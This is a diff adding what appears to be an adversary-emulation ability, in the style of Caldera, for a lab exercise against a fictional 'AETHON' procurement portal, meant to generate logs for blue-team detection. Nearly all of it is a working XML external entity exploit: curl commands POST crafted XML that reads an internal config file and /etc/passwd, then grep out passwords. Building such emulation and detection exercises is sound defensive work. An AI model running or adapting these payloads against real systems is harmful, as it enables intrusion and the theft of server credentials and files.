@@ -1,0 +1,53 @@
+- name: AETHON XXE — Read Internal Config via XML External Entity Injection
+  description: >
+    Exploits an XXE vulnerability in the AETHON procurement portal PHP endpoint.
+    Sends a crafted XML document with an external entity referencing
+    /var/www/html/config/internal.xml to extract credentials for the internal
+    Document Management System (aethon-docs). Generates Apache access logs,
+    PHP error logs, and libxml parse events for blue team detection.
+  tactic: initial-access
+  technique_id: T1190
+  technique_name: Exploit Public-Facing Application
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  executors:
+  - name: sh
+    platform: linux
+    command: >
+      TARGET_HOST=$(cat /tmp/aethon_target_m1 2>/dev/null || echo "aethon-web");
+      XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE procurement [<!ENTITY xxe SYSTEM "file:///var/www/html/config/internal.xml">]><procurement><type>COMPONENT_RFQ</type><vendor_id>VND-RECON-001</vendor_id><items><item><sku>&xxe;</sku><quantity>1</quantity></item></items></procurement>';
+      echo "[*] Sending XXE payload to http://$TARGET_HOST/api/submit-procurement.php";
+      curl -s -X POST "http://$TARGET_HOST/api/submit-procurement.php"
+        -H "Content-Type: application/xml"
+        -d "$XXE_PAYLOAD" -o /tmp/xxe_response.txt;
+      echo "[*] Response saved to /tmp/xxe_response.txt";
+      cat /tmp/xxe_response.txt;
+      echo "[*] Extracting credentials...";
+      grep -oP '(?<=<password>)[^<]+' /tmp/xxe_response.txt || echo "No XML creds found in response — check /tmp/xxe_response.txt manually"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_sh
+      parserconfigs:
+      - source: validate_me
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup:
+    - rm -f /tmp/xxe_response.txt /tmp/aethon_target_m1
+    variations:
+    - description: Read /etc/passwd via XXE for recon
+      command: >
+        TARGET_HOST=$(cat /tmp/aethon_target_m1 2>/dev/null || echo "aethon-web");
+        PASSWD_XXE='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><procurement><type>COMPONENT_RFQ</type><vendor_id>VND-TEST-001</vendor_id><items><item><sku>&xxe;</sku><quantity>1</quantity></item></items></procurement>';
+        curl -s -X POST "http://$TARGET_HOST/api/submit-procurement.php"
+          -H "Content-Type: application/xml"
+          -d "$PASSWD_XXE"
+    additional_info: {}
+  requirements: []
+  id: 3f8a1c2d4e5b6789abcdef012345678a
